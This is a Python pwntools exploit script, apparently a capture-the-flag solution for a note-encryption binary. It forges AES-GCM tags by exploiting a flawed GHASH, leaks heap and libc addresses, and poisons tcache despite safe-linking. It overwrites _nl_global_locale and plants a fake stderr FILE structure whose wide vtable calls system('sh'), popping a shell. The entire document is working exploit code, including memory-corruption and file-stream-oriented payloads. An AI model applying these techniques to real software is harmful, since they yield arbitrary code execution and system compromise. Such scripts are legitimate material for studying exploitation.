from pwn import *
from Cryptodome.Util.strxor import strxor


context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

def create(idx, content):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Index: ', str(idx))
    p.send(content)

def read(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Index: ', str(idx))

def encrypt(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Index: ', str(idx))
    p.recvuntil(b'Ciphertext: ')
    return p.recvline().strip()

def decrypt(idx, ciphertext):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'Index: ', str(idx))
    p.sendlineafter(b'Ciphertext: ', ciphertext)

def delete(idx):
    p.sendlineafter(b'> ', b'5')
    p.sendlineafter(b'Index: ', str(idx))

def exit():
    p.sendlineafter(b'> ', b'6')

def safe_linking(heap_addr, addr):
    return (heap_addr >> 12) ^ addr

# ============ GF(2^128) ARITHMETIC ============
def to_bytes(data) -> bytes:
    """Convert hex string or bytes to 16-byte value"""
    if isinstance(data, str):
        return bytes.fromhex(data)
    elif isinstance(data, bytes):
        if len(data) == 32:
            return bytes.fromhex(data.decode())
        elif len(data) == 16:
            return data
        else:
            return data
    return data
def bytes_to_field(b: bytes) -> int:
    """Convert 16 bytes to GF(2^128) field element (bit-reflected)"""
    b = to_bytes(b)
    n = int.from_bytes(b, 'big')
    reflected = int(f"{n:0128b}"[::-1], 2)
    return reflected
def field_to_bytes(f: int) -> bytes:
    """Convert GF(2^128) field element back to 16 bytes"""
    f = f & ((1 << 128) - 1)
    reflected = int(f"{f:0128b}"[::-1], 2)
    return reflected.to_bytes(16, 'big')
def gf128_mult(a: int, b: int) -> int:
    """Multiply two elements in GF(2^128)"""
    REDUCTION = 0x87
    MASK = (1 << 128) - 1
    result = 0
    a, b = a & MASK, b & MASK
    for i in range(128):
        if (b >> i) & 1:
            result ^= a
        high_bit = (a >> 127) & 1
        a = (a << 1) & MASK
        if high_bit:
            a ^= REDUCTION
    return result & MASK
# ============ BUGGY GHASH ============
def buggy_ghash(H: bytes, data: bytes) -> bytes:
    """
    Buggy GHASH: Y_i = (Y_{i-1} * H) XOR X_i
    (multiply BEFORE xor, instead of standard xor-then-multiply)
    """
    H_field = bytes_to_field(H)
    Y = 0  # Start with 0
    
    # Pad data to multiple of 16 bytes
    padded = data + b'\x00' * (-len(data) % 16)
    
    # Process each block
    for i in range(0, len(padded), 16):
        block = padded[i:i+16]
        X = bytes_to_field(block)
        Y = gf128_mult(Y, H_field) ^ X  # Buggy: multiply then XOR
    
    # Process length block (just ciphertext length, no AAD)
    length_bits = len(data) * 8
    length_block = b'\x00' * 8 + length_bits.to_bytes(8, 'big')
    L = bytes_to_field(length_block)
    Y = gf128_mult(Y, H_field) ^ L  # Buggy: multiply then XOR
    
    return field_to_bytes(Y)
# ============ FORGE FUNCTION ============
def forge_gcm(plaintext: bytes, H: bytes, iv: bytes, EkJ: list) -> bytes:
    """
    Forge valid GCM ciphertext and tag.
    
    Args:
        plaintext: The desired plaintext
        H: The hash key (16 bytes)
        iv: The IV to use (16 bytes, use all zeros for simplicity)
        EkJ: List of E_K(J_i) values where:
             - EkJ[0] = E_K(J0) used for tag
             - EkJ[1] = E_K(J1) keystream for block 1
             - EkJ[2] = E_K(J2) keystream for block 2, etc.
    
    Returns:
        Forged payload: TAG(16) || IV(16) || CIPHERTEXT
    """
    # Number of blocks needed
    num_blocks = (len(plaintext) + 15) // 16
    
    if num_blocks + 1 > len(EkJ):
        raise ValueError(f"Need {num_blocks + 1} EkJ values, only have {len(EkJ)}")
    
    # Encrypt plaintext using CTR mode
    ciphertext = b''
    for i in range(num_blocks):
        start = i * 16
        end = min(start + 16, len(plaintext))
        pt_block = plaintext[start:end]
        
        # XOR with keystream (EkJ[i+1] because EkJ[0] is for tag)
        keystream = EkJ[i + 1][:len(pt_block)]
        ct_block = strxor(pt_block, keystream)
        ciphertext += ct_block
    
    # Compute GHASH over ciphertext
    ghash_out = buggy_ghash(H, ciphertext)
    
    # Compute tag: GHASH XOR E_K(J0)
    tag = strxor(ghash_out, EkJ[0])
    
    # Return payload: TAG || IV || CIPHERTEXT
    return tag + iv + ciphertext

p = process('./chall')
#p = remote('35.185.46.39', 5000)
elf = ELF('./chall')
libc = ELF('./libc.so.6')


create(0, b'\n' * 0x9)
output = encrypt(0)
print(output)

tag = int(output[:0x20], 16)
iv = output[0x20:0x40]
ciphertext = output[0x40:]

tag = hex(tag ^ (0x9 * 8) ^ (0x179 * 8)).encode()[2:]
ciphertext = b'00' * 0x170 + ciphertext

forge_ct = tag + iv + ciphertext

decrypt(1, forge_ct)

create(2, b'\x00' * 0x10)
read(1)

p.recvuntil(b'Text: ')
leak = p.recvuntil(b'1.')[:-3]
H0 = leak[0x190:0x1a0]
print(H0.hex())
delete(2)

read(1)
p.recvuntil(b'Text: ')
leak = p.recvuntil(b'1.')[:-3]
heap = u64(leak[0x190:0x198]) << 12

for i in range(10):
    create(i + 2, b'\x00')

for i in range(6):
    delete(9 - i)
delete(2)
delete(10)
delete(3)
decrypt(2, forge_ct)


read(2)
p.recvuntil(b'Text: ')
leak = p.recvuntil(b'1.')[:-3]
libc.address = u64(leak[0x190:0x198]) - 0x203ca0

log.info('libc: ' + hex(libc.address))
log.info('heap: ' + hex(heap))
log.info('H0: ' + H0.hex())

delete(2)
create(2, b'a' * 0x10)
read(1)
p.recvuntil(b'Text: ')
leak = p.recvuntil(b'1.')[:-3]
ct = leak[0x190:0x1a0]
#print(ct.hex())

print(b'iv: ' + iv)
print(b'H: ' + H0.hex().encode())

iv = b'\x00' * 16
J = []
cnt = 57
for i in range(cnt):
    J.append(b'\x00' * 15 + p8(0x80 + i))


EkJ = []
for i in range(cnt):
    delete(2)
    create(2, J[i])
    read(1)
    p.recvuntil(b'Text: ')
    leak = p.recvuntil(b'1.')[:-3]
    EkJ.append(leak[0x190:0x1a0])

#desired_plaintext = b'a' * 0x178 + p64(0x200) + fsop
#forged_fsop = forge_gcm(desired_plaintext, H0.hex(), iv, EkJ)
delete(2)

for i in range(0x8):
    create(i + 2, b'\x00')

delete(4)
delete(3)
delete(2)
delete(1)

_IO_2_1_stderr_ = libc.symbols["_IO_2_1_stderr_"]
_nl_global_locale = libc.address + 0x2043c0
desired_plaintext = b'a' * 0x178 + p64(0x200) + p64(0) + p64(0x191) + p64(safe_linking(heap, _nl_global_locale - 0x180))
forged_payload = forge_gcm(desired_plaintext, H0.hex(), iv, EkJ)
decrypt(1, forged_payload.hex())
create(2, b'\x00')

fake_file = libc.symbols["_IO_2_1_stderr_"]
fsop = flat(
    {
        # fake_file->file._flags
        # requirements:
        # (_flags & 0x0002) == 0
        # (_flags & 0x0008) == 0
        # (_flags & 0x0800) == 0
        # basic approach with spaces:
        # " sh\x00"
        # 0x20, 0x73, 0x68, 0x00
        # 0x00: b" sh\x00",
        # without spaces:
        # 0x61, 0x61, 0x3b, 0x73, 0x68, 0x00
        0x00: b"aa;sh\x00\x00",
        # fake_file->file._wide_data->_IO_write_base
        0x08: p64(0),
        # fake_file->file._IO_write_base
        # fake_file->file._wide_data->_IO_buf_base
        0x20: p64(0),
        # fake_file->file._IO_write_ptr
        0x28: p64(1),
        # fake_file->file._wide_data->_wide_vtable->__doallocate
        0x68: libc.symbols["system"],
        # fake_file->file._lock
        0x88: libc.address + 0x205700,
        # fake_file->file._wide_data
        0xA0: fake_file - 0x10,
        # fake_file->file._mode
        0xC0: p64(0),
        # fake_file->file._wide_data->_wide_vtable
        0xD0: fake_file,
        # fake_file->vtable
        0xD8: libc.symbols["_IO_wfile_jumps"],
    }
)

_IO_list_all = libc.symbols['_IO_list_all']
desired_plaintext = b'\x00' * 0x178 + p64(0x200)


def build_fake_nl_global_locale(libc_base):
    """
    Build fake _nl_global_locale structure.
    libc_base should be libc.address
    """
    # Offsets calculated from the memory dump
    # Each entry is (offset_low, offset_high) for the two qwords per line
    offsets = [
        (0x1ffe20, 0x200500),   # +0:   _nl_global_locale[0:16]
        (0x200640, 0x1ffd40),   # +16:  _nl_global_locale[16:32]
        (0x2002c0, 0x200260),   # +32:  _nl_global_locale[32:48]
        (0x000000, 0x200580),   # +48:  NULL, then pointer
        (0x200480, 0x1ffca0),   # +64:  _nl_global_locale[64:80]
        (0x2005e0, 0x200200),   # +80:  _nl_global_locale[80:96]
        (0x200140, 0x1b28c0),   # +96:  _nl_global_locale[96:112]
        (0x1b19c0, 0x1b1fc0),   # +112: _nl_global_locale[112:128]
        (0x1cca38, 0x1cca38),   # +128: _nl_global_locale[128:144]
        (0x1cca38, 0x1cca38),   # +144: _nl_global_locale[144:160]
        (0x1cca38, 0x1cca38),   # +160: _nl_global_locale[160:176]
        (0x1cca38, 0x1cca38),   # +176: _nl_global_locale[176:192]
        (0x1cca38, 0x1cca38),   # +192: _nl_global_locale[192:208]
        (0x1cca38, 0x1cca38),   # +208: _nl_global_locale[208:224]
        (0x1cca38, 0x000000),   # +224: _nl_global_locale[224:232], then NULL
    ]
    
    data = b''
    for off_lo, off_hi in offsets:
        if off_lo == 0:
            data += p64(0)
        else:
            data += p64(libc_base + off_lo)
        
        if off_hi == 0:
            data += p64(0)
        else:
            data += p64(libc_base + off_hi)
    
    return data
desired_plaintext += build_fake_nl_global_locale(libc.address)
desired_plaintext += p64(0) * 2
desired_plaintext += p64(_IO_2_1_stderr_) + p64(0) * 3
desired_plaintext += fsop

forged_fsop = forge_gcm(desired_plaintext, H0.hex(), iv, EkJ)



decrypt(3, forged_fsop.hex())

exit()


p.interactive()